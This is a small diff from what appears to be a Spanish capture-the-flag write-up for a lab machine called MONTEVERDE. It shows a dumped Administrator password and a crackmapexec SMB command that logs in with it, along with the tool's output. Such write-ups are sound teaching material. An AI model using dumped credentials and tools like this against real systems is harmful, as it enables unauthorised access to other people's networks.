@@ -242,6 +242,7 @@ Password: d0m@in4dminyeah!
 {% endraw %}
 
 Veo que finalmente logre dumpear la contraseña del usuario `Administrator`
+
 ```bash
 crackmapexec smb 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'
 SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
